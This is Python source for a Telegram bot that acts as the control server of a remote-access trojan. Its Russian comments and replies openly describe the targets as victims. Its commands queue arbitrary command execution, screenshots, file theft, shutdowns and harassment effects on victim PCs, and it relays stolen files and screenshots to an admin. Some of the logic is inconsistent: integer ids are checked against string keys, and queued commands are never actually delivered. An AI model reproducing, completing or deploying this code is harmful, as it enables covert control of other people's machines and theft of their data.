import telebot
import os
import subprocess
import time
import requests
import json

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

if not BOT_TOKEN or ADMIN_ID == 0:
    print("ERROR: Set BOT_TOKEN and ADMIN_ID in Variables")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# Хранилище для связи victim_id -> последняя команда
victims = {}  # victim_id: {"last_cmd": "", "last_result": ""}

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.reply_to(message, "❌ Access denied")
        return
    bot.reply_to(message, 
        "✅ Бот-сервер запущен\n\n"
        "📋 /list — список активных ПК жертв\n"
        "📸 /screenshot [id] — скриншот ПК жертвы\n"
        "💻 /cmd [id] [команда] — выполнить команду на ПК жертвы\n"
        "📂 /get [id] [путь] — скачать файл с ПК жертвы\n"
        "📁 /send [id] — отправить файл на ПК жертвы (ответом на команду)\n"
        "🔌 /shutdown [id] — выключить ПК жертвы\n"
        "🔄 /restart [id] — перезагрузить ПК жертвы\n"
        "🐭 /mouse_jitter [id] — включить конвульсии мыши на ПК жертвы\n"
        "🎨 /glitch [id] — глитч-эффект на ПК жертвы")

@bot.message_handler(commands=['list'])
def list_victims(message):
    if message.chat.id != ADMIN_ID:
        return
    if not victims:
        bot.reply_to(message, "Нет активных ПК жертв")
        return
    msg = "Активные ПК жертв:\n"
    for vid, data in victims.items():
        msg += f"🖥️ ID: {vid}\n"
    bot.reply_to(message, msg)

@bot.message_handler(commands=['screenshot'])
def cmd_screenshot(message):
    if message.chat.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Используй: /screenshot victim_id")
        return
    vid = parts[1]
    if vid not in victims:
        bot.reply_to(message, "❌ Жертва с таким ID не найдена")
        return
    victims[vid]["last_cmd"] = "SCREENSHOT"
    bot.reply_to(message, f"📸 Запрос скриншота отправлен жертве {vid}. Ожидайте ответа...")

@bot.message_handler(commands=['cmd'])
def cmd_run(message):
    if message.chat.id != ADMIN_ID:
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "❌ Используй: /cmd victim_id command")
        return
    vid = parts[1]
    command = parts[2]
    if vid not in victims:
        bot.reply_to(message, "❌ Жертва с таким ID не найдена")
        return
    victims[vid]["last_cmd"] = f"CMD:{command}"
    bot.reply_to(message, f"💻 Команда отправлена жертве {vid}: {command}")

@bot.message_handler(commands=['get'])
def cmd_get(message):
    if message.chat.id != ADMIN_ID:
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "❌ Используй: /get victim_id C:\\path\\to\\file")
        return
    vid = parts[1]
    path = parts[2]
    if vid not in victims:
        bot.reply_to(message, "❌ Жертва с таким ID не найдена")
        return
    victims[vid]["last_cmd"] = f"GET:{path}"
    bot.reply_to(message, f"📂 Запрос файла отправлен жертве {vid}: {path}")

@bot.message_handler(commands=['shutdown'])
def cmd_shutdown(message):
    if message.chat.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Используй: /shutdown victim_id")
        return
    vid = parts[1]
    if vid not in victims:
        bot.reply_to(message, "❌ Жертва с таким ID не найдена")
        return
    victims[vid]["last_cmd"] = "SHUTDOWN"
    bot.reply_to(message, f"🔌 Выключение отправлено жертве {vid}")

@bot.message_handler(commands=['restart'])
def cmd_restart(message):
    if message.chat.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Используй: /restart victim_id")
        return
    vid = parts[1]
    if vid not in victims:
        bot.reply_to(message, "❌ Жертва с таким ID не найдена")
        return
    victims[vid]["last_cmd"] = "RESTART"
    bot.reply_to(message, f"🔄 Перезагрузка отправлена жертве {vid}")

@bot.message_handler(commands=['mouse_jitter'])
def cmd_mouse_jitter(message):
    if message.chat.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Используй: /mouse_jitter victim_id")
        return
    vid = parts[1]
    if vid not in victims:
        bot.reply_to(message, "❌ Жертва с таким ID не найдена")
        return
    victims[vid]["last_cmd"] = "MOUSE_JITTER"
    bot.reply_to(message, f"🐭 Конвульсии мыши включены на ПК {vid}")

@bot.message_handler(commands=['glitch'])
def cmd_glitch(message):
    if message.chat.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Используй: /glitch victim_id")
        return
    vid = parts[1]
    if vid not in victims:
        bot.reply_to(message, "❌ Жертва с таким ID не найдена")
        return
    victims[vid]["last_cmd"] = "GLITCH"
    bot.reply_to(message, f"🎨 Глитч-эффект запущен на ПК {vid}")

# Эндпоинт для victims (жертвы отправляют сюда свои данные)
@bot.message_handler(func=lambda m: True)
def handle_victim_response(message):
    # Жертва отправляет свои данные в формате: "VICTIM_DATA:id|screen|command_output|file"
    # Но проще: жертва пишет боту любые сообщения, а мы их форвардим админу
    if message.chat.id not in victims:
        # Новый victim
        victims[str(message.chat.id)] = {"last_cmd": "", "last_result": ""}
        bot.reply_to(message, "✅ Ты подключён к серверу управления. Ожидай команд от администратора.")
        bot.send_message(ADMIN_ID, f"🖥️ НОВЫЙ ПК ЖЕРТВЫ ПОДКЛЮЧЁН! ID: {message.chat.id}")
    elif message.text and message.text.startswith("RESULT:"):
        # Результат выполнения команды
        bot.send_message(ADMIN_ID, f"📊 Результат от {message.chat.id}:\n{message.text[7:]}")
    elif message.photo:
        # Фото-скриншот
        file_id = message.photo[-1].file_id
        bot.send_photo(ADMIN_ID, file_id, caption=f"📸 Скриншот от {message.chat.id}")
    elif message.document:
        # Файл
        file_id = message.document.file_id
        bot.send_document(ADMIN_ID, file_id, caption=f"📁 Файл от {message.chat.id}")
    else:
        bot.reply_to(message, "Ожидаю команд от администратора...")

if __name__ == "__main__":
    print("🚀 Railway бот-сервер запущен")
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Ошибка: {e}")
            time.sleep(5)
